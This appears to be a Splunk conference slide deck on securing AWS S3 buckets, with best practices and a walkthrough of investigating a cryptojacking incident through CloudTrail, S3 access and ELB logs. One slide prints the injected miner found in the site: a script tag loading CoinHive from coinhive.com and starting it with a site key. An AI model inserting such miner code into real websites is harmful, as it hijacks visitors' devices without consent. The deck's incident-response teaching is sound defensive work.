© 2020 SPLUNK INC.
Put a Lid on Those AWS S3 Buckets
SANS Cloud Security Summit
Lily Lee | Staff Security Strategist Melisa Napoles | Solutions Engineer
May 29, 2020

ForwardLooking Statements

© 2020 SPLUNK INC.
During the course of this presentation, we may make forward-looking statements regarding future events or plans of the company. We caution you that such statements reflect our current expectations and estimates based on factors currently known to us and that actual events or results may differ materially. The forward-looking statements made in the this presentation are being made as of the time and date of its live presentation. If reviewed after its live presentation, it may not contain current or accurate information. We do not assume any obligation to update any forward-looking statements made herein.
In addition, any information about our roadmap outlines our general product direction and is subject to change at any time without notice. It is for informational purposes only, and shall not be incorporated into any contract or other commitment. Splunk undertakes no obligation either to develop the features or functionalities described or to include any such feature or functionality in a future release.
Splunk, Splunk>, Data-to-Everything, D2E and Turn Data Into Doing are trademarks and registered trademarks of Splunk Inc. in the United States and other countries. All other brand names, product names or trademarks belong to their respective owners. © 2020 Splunk Inc. All rights reserved

Who Are We

© 2020 SPLUNK INC.

Melisa Napoles
Passionate about Big (and small) Data, Cloud and CyberSecurity

Lily Lee
GCIH, GMON, WiCyS Silicon Valley

Goals

© 2020 SPLUNK INC.

 Why focus on misconfigured buckets?  What are the anticipated and unanticipated fallouts of misconfigured buckets?  What are the key data sources for identifying misconfigured buckets?  How do I pivot between data sources for understanding what happened?

A Quick Recap from SANS Cloud Security Summit 2019
"Keep It Flexible­How Cloud Makes It Easier and Harder to Detect Bad Stuff"

© 2020 SPLUNK INC.

 On-premises infrastructure mapped to corresponding AWS services  AWS Shared Responsibility Model  Understand what data is security-relevant; and where and how to get that data  An in-depth look at CloudTrail to detect malicious activity  Best practice checklist (e.g., AWS Trusted Advisor, AWS Knowledge Center)

Secure the Files in Your Amazon S3 Bucket

© 2020 SPLUNK INC.

Common (Human) Errors
 Allowing anonymous access  Allowing file listing  Allowing arbitrary file upload / download  Allowing read / writes of objects  Allowing control of the files and objects  Revealing ACP / ACL

Best Practices
 Restrict access to your S3 resources (IAM user permissions, bucket policies, ACLs)
 Use encryption to protect your data (at rest+in transit)  Create data copies  Enable versioning & S3 Object Lock  Enable multi-factor authentication delete  Monitor your S3 resources (S3 access logging,
CloudTrail, Config)  Use S3 Access Points to manage data at scale  Use block public access setting  Enable AWS Config rules
(s3-bucket-public-[write|read]-prohibited)

© 2020 SPLUNK INC.
S3 Misconfiguration Can Lead to Data Breach and Other Security Incidents
A few examples

Financial Data Login Credentials

Proprietary Data PII Data Payment Data

Injection Attack

Credit Card Skimming

Config Files Encryption Keys

Website Content

Ransomware Attack

Denial of Wallet Attack

Time Warner Cable
Instagram
Alteryx
Dow Jones
THSuite

Inadvertent AWS S3 Data Breaches
PII exposed ranging from 30,000 to 540 million people
National Credit Federation
Facebook Uber WWE Verizon Communications U.S. Voter Records

© 2020 SPLUNK INC.

Real-World Attack Scenario
S3 Misconfiguration Leading to Cryptojacking

© 2020 SPLUNK INC.

Example AWS Cloud Architecture for Web Application Hosting

www.example.com A

media.example.com F

G Edge Security for CloudFront with WAF B

C Firewalls with Security Groups H

© 2020 SPLUNK INC.

D E
Amazon Virtual Private Cloud

What Is Cryptomining / Cryptojacking?

© 2020 SPLUNK INC.

CRYPTOMINING

CRYPTOJACKING

Using computer resources, such as CPU cycles, in exchange for
money, or cryptocurrency.

The unauthorized use of someone else's device or machine to mine cryptocurrency (i.e., malicious cryptomining).

© 2020 SPLUNK INC.

How Can Cryptojacking Occur?
Distribution mechanisms

Install cryptomining code / software

Browser-based cryptomining
code

Public / Guest Wi-Fi

Any device that can provide CPU cycles and electricity is vulnerable

JavaScript code that executes when loaded in
the web browser

Wi-Fi
Inject cryptomining content to HTML requests

frothlywebcode frothlywebcode

© 2020 SPLUNK INC.

www.brewertalk.com

© 2020 SPLUNK INC.

The Attack Scenario
www.brewertalk.com

3
User loads the website and executes the mining code.

© 2020 SPLUNK INC.

2
A burst of web traffic causes the web infra to
spin up more EC2 instances with the new
website code.

STORED WEB SERVER CODE

1
Hacker discovers our website content in the public bucket,
downloads it, adds the mining code, and uploads a new
version of the website content back into the bucket.

Amazon Virtual Private Cloud

The Investigation
What Happened Post-Exploit

© 2020 SPLUNK INC.

The Endpoint Investigation

© 2020 SPLUNK INC.
www.brewertalk.com

<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script> var miner = new CoinHive.Anonymous('swUaVm1xhugv49RmyEMucajPO8VPAUlS'); miner.start()
</script>

Err... How did that miner code get into brewertalk.com?
Those weren't my changes!

© 2020 SPLUNK INC.

© 2020 SPLUNK INC.

Reviewing AWS Logs, Part I

www.brewertalk.com

STORED WEB SERVER CODE

STORED WEB SERVER
CODE

Amazon S3 Bucket

1
Review S3 bucket permissions.
 Ensure the S3 bucket is not public.
CLOUDTRAIL  If exposed, confirm when and by whom.
LOGS

2
Audit S3 bucket access.

 Review all bucket activity post exposure

S3 ACCESS LOGS

(especially uploads and downloads).

1 Reviewing AWS Logs, Part I: Review S3 bucket permissions.

© 2020 SPLUNK INC.

What Does Public Read Access Look Like?
CloudTrail Logs
WHERE WHAT WHEN

HOW

WHAT

HOW

WHO

HOW

HOW

2 Reviewing AWS Logs, Part I: Audit S3 bucket access.

© 2020 SPLUNK INC.

What Happened Post Exposure?
S3 Access Logs: A Look at Download (REST.GET.OBJECT) & Upload (REST.PUT.OBJECT) Activity

2 Reviewing AWS Logs, Part I: Audit S3 bucket access.
Notable Activity
OPEN_BUCKET_PLEASE_FIX.txt

REMOTE IP

UPLOAD(S)

© 2020 SPLUNK INC.

2 Reviewing AWS Logs, Part I: Audit S3 bucket access.
Notable Activity
frothly_html_memcached.tar.gz

REMOTE IP

DOWNLOAD(S) UPLOAD(S)

© 2020 SPLUNK INC.

2 Reviewing AWS Logs, Part I: Audit S3 bucket access.
Another Look at the Architecture ...
Web Server Code Stored in S3 Bucket
www.brewertalk.com

© 2020 SPLUNK INC.

Web Server

Web Server

Auto Scaling Group

STORED WEB
SERVER CODE

STORED WEB SERVER
CODE

Amazon S3 Bucket

frothly_html_memcached.tar.gz is our web server code!

© 2020 SPLUNK INC.

Reviewing AWS Logs, Part II
Investigate the Web Infrastructure for Suspicious Activity

www.brewertalk.com

Web Server

Web Server

Auto Scaling Group

STORED WEB
SERVER CODE

STORED WEB SERVER
CODE

Amazon S3 Bucket

3
Confirm the purpose of `frothly_html_memcached.tar.gz'.
ENDPOINT LOGS
4
Review external web requests for suspicious activity.
ELB ACCESS LOGS
5
How did the modified code get deployed to the web servers?
CLOUDTRAIL LOGS

3 Reviewing AWS Logs, Part II: Confirm the purpose of `frothly_html_memcached.tar.gz'.
User Data and Cloud-Init
Bootstrapping an EC2 Instance

© 2020 SPLUNK INC.

HOW IT WORKS

EC2 Instance Launch

Web Server
EC2

User Data

cloud-init

Command output from the script
Configure Instance

For more information: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html

4 Reviewing AWS Logs, Part II: Review external web requests for suspicious activity.
Notable Web Activity­What to Look For

© 2020 SPLUNK INC.

 Count of requests by remote IP, geolocation, user agent  Count of requests by destination target (i.e., web tier)  Top requests by storage object URL  Baseline response sizes and processing times  Analyze traffic patterns (e.g., frequency, distribution)  Look for server errors (e.g., HTTP 503 errors)

4 Reviewing AWS Logs, Part II: Review external web requests for suspicious activity.
Notable Web Activity
ELB Access Logs
Was 172.16.0.145 an auto-scaled instance post
S3 bucket exposure?
Count of Requests by Destination Target

© 2020 SPLUNK INC.
Note the traffic spikes.

Count of Requests by Client IP

4 Reviewing AWS Logs, Part II: Review external web requests for suspicious activity.

EC2 Auto Scaling Information
CloudTrail Logs

After the bucket was made public ...

An EC2 instance was started ...

© 2020 SPLUNK INC.

... By EC2 Auto Scaling

5 Reviewing AWS Logs, Part II: How did the modified code get deployed to the web servers?
The Modified Code Was Deployed

The associated private IP is 172.16.0.145 which is the auto-scaled instance.

Automation script downloads the tar.gz as part of initial configuration.

© 2020 SPLUNK INC.
Object size matches
modified code

© 2020 SPLUNK INC.
Recovery: Securing the S3 Bucket Permissions
Confirmed by CloudTrail Logs
TABULAR VIEW OF CLOUDTRAIL LOGS SHOWING THERE WAS PUBLIC READ / WRITE ACCESS
TABULAR VIEW OF CLOUDTRAIL LOGS SHOWING THE PUBLIC READ / WRITE ACCESS WAS REVOKED

Recovery: Reverting the Website Code
Confirmed by S3 Access Logs

© 2020 SPLUNK INC.

Investigation Summary

Bucket Content

Unexpected Traffic Patterns

© 2020 SPLUNK INC.

Bucket Name

Collaboration

Forensics

Remediation Summary

© 2020 SPLUNK INC.

Key Takeaways

© 2020 SPLUNK INC.
 Don't forget about core security practices when it comes to securing your data (e.g., least privilege access).
 Use a continuous monitoring and reporting solution to detect changes made by internal users AND your vendors.
 Access logging is the key to identifying misconfigured S3 buckets.
 Securing data stored in the cloud is a shared responsibility.

© 2020 SPLUNK INC.
Thank You

